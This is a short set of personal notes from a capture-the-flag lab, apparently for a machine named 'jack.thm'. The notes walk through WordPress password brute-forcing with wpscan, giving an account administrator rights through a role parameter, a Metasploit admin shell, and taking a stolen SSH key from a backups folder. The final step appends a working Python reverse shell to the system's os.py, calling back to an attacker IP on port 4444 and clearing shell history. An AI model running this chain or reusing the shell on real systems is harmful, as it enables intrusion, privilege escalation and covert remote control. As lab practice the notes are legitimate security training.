noticed admin page makes you go to a url
set /etc/hosts:
10.10.159.86 jack.thm


wpscan --url http://jack.thm/ -t 3 -P /usr/share/wordlists/fasttrack.txt -U users.txt

adding &ure_other_roles=administrator to give you admin privs:

after using wordpress admin shell metasploit, found I had to log out, log back in, confirm email, then run exploit

upgrade shell after meterpreter wordpress admin shell:
python -c 'import pty; pty.spawn("/bin/bash")'

just pecking around, saw a note in reminder.txt in jack's home dir to stop doing bad backups.

looked in /var/backups and saw id_rsa, time to ssh!

use linpeas

good reading (and php shell plugin edit)

I was able to write to:
/usr/lib/python2.7/os.py

So, set up listener on local host:
nc -nlvp 4444

created text.py:
import os
import pty
import socket
ZIP_DEFLATED=0
class ZipFile:
    def close(*args):return
    def write(*args): return
    def __init__(self, *args):return

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.13.1.70',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv('HISTFILE','/dev/null')
pty.spawn('/bin/bash')
s.close()

cat text.py >> /usr/lib/python2.7/os.py


Then I waited... actually logging in once might have helped, but waiting seemed to work.
